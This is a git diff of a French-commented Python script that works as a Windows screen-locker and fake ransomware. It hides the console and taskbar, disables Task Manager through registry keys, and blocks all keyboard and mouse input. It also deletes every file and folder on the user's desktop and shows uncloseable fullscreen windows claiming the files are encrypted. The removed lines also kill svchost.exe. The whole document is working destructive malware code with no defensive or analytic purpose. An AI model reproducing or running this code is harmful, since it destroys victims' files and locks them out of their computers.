@@ -2,6 +2,7 @@ import ctypes
 import os
 import sys
 import threading
+import time
 import tkinter as tk
 from tkinter import messagebox
 from PIL import Image, ImageTk
@@ -9,172 +10,16 @@ import winreg
 import win32gui
 import win32con
 import shutil
-from pynput import keyboard
+from pynput import keyboard, mouse
 import pygame
+import subprocess
+import random
 
-# Cache la console Windows direct
+# -------------------- Fonctions utilitaires --------------------
 def hide_console():
     whnd = ctypes.windll.kernel32.GetConsoleWindow()
     if whnd != 0:
         ctypes.windll.user32.ShowWindow(whnd, 0)
-
-
-import subprocess
-
-def fermer_apres_delay(nom_programme, delay=15):
-    # Attendre le délai
-    time.sleep(delay)
-    
-    # Fermer le programme
-    subprocess.run(["taskkill", "/f", "/im", nom_programme])
-    
-
-# Exemple pour svchost
-
-from pynput import keyboard, mouse
-
-def lock_input():
-    """
-    Désactive la souris et le clavier indéfiniment.
-    """
-    # Bloque le clavier
-    def block_key(key):
-        return False  # empêche toute touche
-
-    # Bloque la souris
-    def block_mouse(*args):
-        return False
-
-    # Listeners
-    kb_listener = keyboard.Listener(on_press=block_key)
-    ms_listener = mouse.Listener(on_move=block_mouse, on_click=block_mouse, on_scroll=block_mouse)
-
-    kb_listener.start()
-    ms_listener.start()
-
-    # Boucle infinie pour que le script reste actif
-    kb_listener.join()
-    ms_listener.join()
-
-# Appelle la fonction
-
-
-
-
-import tkinter as tk
-import random
-
-def trippy_screen():
-    root = tk.Tk()
-    root.attributes("-fullscreen", True)
-    root.configure(bg="black")
-
-    # Désactiver Alt+F4
-    root.protocol("WM_DELETE_WINDOW", lambda: None)
-
-    width = root.winfo_screenwidth()
-    height = root.winfo_screenheight()
-    canvas = tk.Canvas(root, width=width, height=height)
-    canvas.pack()
-
-    colors = ["red", "blue", "green", "yellow", "purple", "orange"]
-    carre_size = 200  # gros carrés
-
-    # Fond brumeux (un overlay gris semi-transparent)
-    canvas.create_rectangle(0, 0, width, height, fill="gray", stipple="gray50")
-
-    def draw_squares():
-        # carrés aléatoires
-        x = random.randint(0, width - carre_size)
-        y = random.randint(0, height - carre_size)
-        color = random.choice(colors)
-        canvas.create_rectangle(x, y, x + carre_size, y + carre_size, fill=color, outline="")
-        root.after(2000, draw_squares)  # toutes les 2 secondes
-
-    draw_squares()
-    root.mainloop()
-
-
-
-
-
-def play_music_loop():
-    pygame.mixer.init()
-    pygame.mixer.music.load("music.mp3")
-    pygame.mixer.music.set_volume(1.0)
-    pygame.mixer.music.play(-1)  # boucle infinie
-    while True:
-        pygame.time.Clock().tick(10)
-
-def boucle_erreurs_gui():
-    root = tk.Tk()
-    root.title("bztp la grosse slp ! ya une skibidi erreur ❤️")
-    root.geometry("600x400")
-    text_box = tk.Text(root, bg="black", fg="red", font=("Consolas", 12))
-    text_box.pack(expand=True, fill=tk.BOTH)
-
-    def spam_errors():
-        while True:
-            try:
-                1 / 0
-            except Exception:
-                text_box.insert(tk.END, "Salamalékoum rouya menge ma paffette ! 😇\n")
-                text_box.see(tk.END)
-            # Petit sleep pour éviter de flooder à mort
-            import time
-            time.sleep(0.1)
-
-    threading.Thread(target=spam_errors, daemon=True).start()
-    root.mainloop()
-
-def slideshow_images():
-    root = tk.Tk()
-    root.overrideredirect(True)
-    root.attributes("-topmost", True)
-    screen_width = root.winfo_screenwidth()
-    screen_height = root.winfo_screenheight()
-    root.geometry(f"{screen_width}x{screen_height}+0+0")
-
-    images = []
-    for i in range(1, 6):
-        path = f"skibidi{i}.jpeg"
-        if os.path.exists(path):
-            img = Image.open(path)
-            img = img.resize((screen_width, screen_height), Image.ANTIALIAS)
-            images.append(ImageTk.PhotoImage(img))
-
-    label = tk.Label(root)
-    label.pack()
-
-    def update(idx=0):
-        label.config(image=images[idx])
-        root.after(2000, lambda: update((idx + 1) % len(images)))
-
-    if images:
-        update()
-        root.mainloop()
-
-def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
-    root = tk.Tk()
-    root.overrideredirect(True)
-    root.attributes("-topmost", True)
-    root.configure(bg="red")
-
-    screen_width = root.winfo_screenwidth()
-    screen_height = root.winfo_screenheight()
-    window_width, window_height = 600, 300
-    x = (screen_width - window_width) // 2
-    y = (screen_height - window_height) // 2
-    root.geometry(f"{window_width}x{window_height}+{x}+{y}")
-
-    main_label = tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red")
-    main_label.pack(pady=(40, 10))
-
-    desc_label = tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red")
-    desc_label.pack()
-
-    root.protocol("WM_DELETE_WINDOW", lambda: None)  # interdit fermeture
-    root.mainloop()
 
 def is_admin():
     try:
@@ -210,7 +55,7 @@ def hide_taskbar():
         winreg.SetValueEx(key, "NoWinKeys", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
     except Exception as e:
-        print(f"Erreur lors de la dissimulation de la barre des tâches : {e}")
+        print(f"Erreur hide_taskbar : {e}")
 
 def disable_task_manager():
     try:
@@ -221,7 +66,6 @@ def disable_task_manager():
             key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, key_path)
         winreg.SetValueEx(key, "DisableTaskMgr", 0, winreg.REG_DWORD, 1)
         winreg.CloseKey(key)
-
         win32gui.SendMessageTimeout(
             win32con.HWND_BROADCAST,
             win32con.WM_SETTINGCHANGE,
@@ -231,7 +75,7 @@ def disable_task_manager():
             5000
         )
     except Exception as e:
-        print(f"Erreur lors de la désactivation du gestionnaire des tâches : {e}")
+        print(f"Erreur disable_task_manager : {e}")
 
 def set_wallpaper(image_path):
     try:
@@ -239,7 +83,7 @@ def set_wallpaper(image_path):
         if os.path.exists(full_path):
             ctypes.windll.user32.SystemParametersInfoW(20, 0, full_path, 3)
     except Exception as e:
-        print(f"Erreur lors du changement du fond d'écran : {e}")
+        print(f"Erreur set_wallpaper : {e}")
 
 def clear_desktop_icons():
     try:
@@ -252,36 +96,137 @@ def clear_desktop_icons():
                 elif os.path.isdir(item_path):
                     shutil.rmtree(item_path)
             except Exception as e:
-                print(f"Erreur lors de la suppression de {item_path} : {e}")
+                print(f"Erreur clear_desktop_icons : {e}")
     except Exception as e:
-        print(f"Erreur lors du nettoyage du bureau : {e}")
+        print(f"Erreur clear_desktop_icons global : {e}")
+
+def fermer_apres_delay(nom_programme, delay=15):
+    time.sleep(delay)
+    subprocess.run(["taskkill", "/f", "/im", nom_programme])
+
+# -------------------- Fonctions visuelles --------------------
+def trippy_screen():
+    root = tk.Tk()
+    root.attributes("-fullscreen", True)
+    root.configure(bg="black")
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+
+    width, height = root.winfo_screenwidth(), root.winfo_screenheight()
+    canvas = tk.Canvas(root, width=width, height=height)
+    canvas.pack()
+    canvas.create_rectangle(0, 0, width, height, fill="gray", stipple="gray50")
+
+    colors = ["red", "blue", "green", "yellow", "purple", "orange"]
+    carre_size = 200
+
+    def draw_squares():
+        x, y = random.randint(0, width - carre_size), random.randint(0, height - carre_size)
+        color = random.choice(colors)
+        canvas.create_rectangle(x, y, x + carre_size, y + carre_size, fill=color, outline="")
+        root.after(2000, draw_squares)
+
+    draw_squares()
+    root.mainloop()
+
+def slideshow_images():
+    root = tk.Tk()
+    root.overrideredirect(True)
+    root.attributes("-topmost", True)
+    screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
+    root.geometry(f"{screen_width}x{screen_height}+0+0")
+
+    images = []
+    for i in range(1, 6):
+        path = f"skibidi{i}.jpeg"
+        if os.path.exists(path):
+            img = Image.open(path).resize((screen_width, screen_height), Image.ANTIALIAS)
+            images.append(ImageTk.PhotoImage(img))
+
+    label = tk.Label(root)
+    label.pack()
+
+    def update(idx=0):
+        label.config(image=images[idx])
+        root.after(2000, lambda: update((idx + 1) % len(images)))
+
+    if images:
+        update()
+        root.mainloop()
+
+def show_final_window(main_text="Votre ordinateur est vérouillé !", description="Tous vos fichiers ont étés encryptés."):
+    root = tk.Tk()
+    root.overrideredirect(True)
+    root.attributes("-topmost", True)
+    root.configure(bg="red")
+
+    screen_width, screen_height = root.winfo_screenwidth(), root.winfo_screenheight()
+    window_width, window_height = 600, 300
+    x, y = (screen_width - window_width) // 2, (screen_height - window_height) // 2
+    root.geometry(f"{window_width}x{window_height}+{x}+{y}")
+
+    tk.Label(root, text=main_text, font=("Arial", 48, "bold"), fg="black", bg="red").pack(pady=(40, 10))
+    tk.Label(root, text=description, font=("Arial", 20), fg="black", bg="red").pack()
+
+    root.protocol("WM_DELETE_WINDOW", lambda: None)
+    root.mainloop()
+
+def boucle_erreurs_gui():
+    root = tk.Tk()
+    root.title("bztp la grosse slp ! ya une skibidi erreur ❤️")
+    root.geometry("600x400")
+    text_box = tk.Text(root, bg="black", fg="red", font=("Consolas", 12))
+    text_box.pack(expand=True, fill=tk.BOTH)
+
+    def spam_errors():
+        while True:
+            try:
+                1 / 0
+            except Exception:
+                text_box.insert(tk.END, "Salamalékoum rouya menge ma paffette ! 😇\n")
+                text_box.see(tk.END)
+            time.sleep(0.1)
+
+    threading.Thread(target=spam_errors, daemon=True).start()
+    root.mainloop()
+
+def play_music_loop():
+    pygame.mixer.init()
+    pygame.mixer.music.load("music.mp3")
+    pygame.mixer.music.set_volume(1.0)
+    pygame.mixer.music.play(-1)
+    while True:
+        pygame.time.Clock().tick(10)
+
+# -------------------- Fonctions de verrouillage --------------------
+def lock_input():
+    def block_key(key): return False
+    def block_mouse(*args): return False
+
+    kb_listener = keyboard.Listener(on_press=block_key)
+    ms_listener = mouse.Listener(on_move=block_mouse, on_click=block_mouse, on_scroll=block_mouse)
+    kb_listener.start()
+    ms_listener.start()
+    kb_listener.join()
+    ms_listener.join()
 
 def keyboard_hook():
     pressed_keys = set()
-
     def on_press(key):
         try:
             pressed_keys.add(key)
-            # Bloque Alt+F4
             if key == keyboard.Key.f4 and (keyboard.Key.alt in pressed_keys or keyboard.Key.alt_l in pressed_keys or keyboard.Key.alt_r in pressed_keys):
                 return False
-            # Bloque Ctrl+Esc
             if key == keyboard.Key.esc and (keyboard.Key.ctrl in pressed_keys or keyboard.Key.ctrl_l in pressed_keys or keyboard.Key.ctrl_r in pressed_keys):
                 return False
-        except Exception as e:
-            print(f"Erreur dans le hook clavier (press) : {e}")
+        except: pass
         return True
-
     def on_release(key):
-        try:
-            pressed_keys.discard(key)
-        except Exception as e:
-            print(f"Erreur dans le hook clavier (release) : {e}")
-
+        pressed_keys.discard(key)
     listener = keyboard.Listener(on_press=on_press, on_release=on_release)
     listener.start()
     return listener
 
+# -------------------- Main --------------------
 def main():
     hide_console()
 
@@ -292,28 +237,19 @@ def main():
     loading_window = show_message("Chargement", "Loading...", borderless=True)
 
     listener = keyboard_hook()
-
     hide_taskbar()
-    lock_input()
-    disable_task_manager()
-    set_wallpaper("IMG_7832.jpeg")
-    clear_desktop_icons()
-    trippy_screen()
-    fermer_apres_delay("svchost.exe", 15)
-
-    # Met la musique en thread pour pas bloquer
+    threading.Thread(target=lock_input, daemon=True).start()
     threading.Thread(target=play_music_loop, daemon=True).start()
-    # Lancement de la GUI erreurs dans un thread sinon ça bloque
+
+    set_wallpaper("wallpaper.jpeg")
+    clear_desktop_icons()
+
+    threading.Thread(target=trippy_screen, daemon=True).start()
+    threading.Thread(target=slideshow_images, daemon=True).start()
     threading.Thread(target=boucle_erreurs_gui, daemon=True).start()
 
-    # Affiche la fenêtre finale (bloquante)
+    loading_window.destroy()
     show_final_window()
-
-    # Après la fin de la fenêtre finale, lance le slideshow (bloquant aussi)
-    slideshow_images()
-
-    loading_window.after(5000, lambda: [loading_window.destroy(), listener.stop()])
-    loading_window.mainloop()
 
 if __name__ == "__main__":
     main()
